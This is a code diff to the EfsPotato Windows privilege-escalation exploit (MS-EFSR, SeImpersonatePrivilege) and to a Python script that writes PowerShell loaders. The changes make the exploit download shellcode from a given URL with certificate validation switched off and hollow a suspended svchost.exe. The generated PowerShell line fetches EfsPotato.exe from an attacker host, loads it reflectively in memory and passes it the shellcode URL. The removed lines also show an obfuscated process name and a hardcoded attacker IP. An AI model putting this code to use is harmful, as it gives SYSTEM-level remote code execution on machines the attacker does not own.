@@ -47,7 +47,7 @@ namespace EfsPotato
 
         static void usage()
         {
-            Console.WriteLine("usage: EfsPotato <cmd> [pipe]");
+            Console.WriteLine("usage: EfsPotato <sc_url> [pipe]");
             Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)\r\n");
         }
         public static void Main(string[] args)
@@ -55,6 +55,7 @@ namespace EfsPotato
             Console.WriteLine("Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).");
             Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.");
             Console.WriteLine("CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]\r\n");
+            Console.WriteLine("Precurse patch for remote shellcode and process hollowing\r\n");
             if (args.Length < 1)
             {
                 usage();
@@ -123,22 +124,13 @@ namespace EfsPotato
                     si.lpDesktop = "WinSta0\\Default";
                     si.dwFlags = 0x101;
                     si.wShowWindow = 0;
-                    String cmd = args[0];
-                        byte[] procname = new byte[] { 0x4a,0x33,0x55,0x55,0x5e,0x60,0x67,0x6d,0x66,0x7e,0x7a,0x55,0x7a,0x70,0x7a,0x7d,0x6c,0x64,0x3a,0x3b,0x55,0x7a,0x7f,0x6a,0x61,0x66,0x7a,0x7d,0x27,0x6c,0x71,0x6c };
+                    String url = args[0];
+                    String procname = "C:\\\\Windows\\system32\\svchost.exe";
+                    ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+                    System.Net.WebClient client = new System.Net.WebClient();
+                    byte[] shellcode = client.DownloadData(url);
 
-                        for (int i = 0; i < procname.Length; i++)
-                        {
-                            procname[i] = (byte)(((uint)procname[i] ^ 0x09) & 0xFF);
-                        }
-
-                            string url = "http://10.10.14.110/sc";
-
-                            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-                            System.Net.WebClient client = new System.Net.WebClient();
-                            byte[] shellcode = client.DownloadData(url);
-
-                    // if (CreateProcessAsUser(tkn, null, procname, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
-                    if (CreateProcessAsUser(tkn, null, System.Text.Encoding.Default.GetString(procname), IntPtr.Zero, IntPtr.Zero, true, 0x4, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+                    if (CreateProcessAsUser(tkn, null, procname, IntPtr.Zero, IntPtr.Zero, true, 0x4, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                     {
                         Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
 
@@ -655,7 +647,7 @@ o = f"""
 $u="http://{ak.LHOST}/EfsPotato.exe"
 $b=(New-object system.net.webclient).DownloadData($u)
 $a=[System.Reflection.Assembly]::Load($b)
-[EfsPotato.Program]::Main("foobar")
+[EfsPotato.Program]::Main("http://{ak.LHOST}/sc")
 """
 
 ak.write_file("output_efs.txt", o)
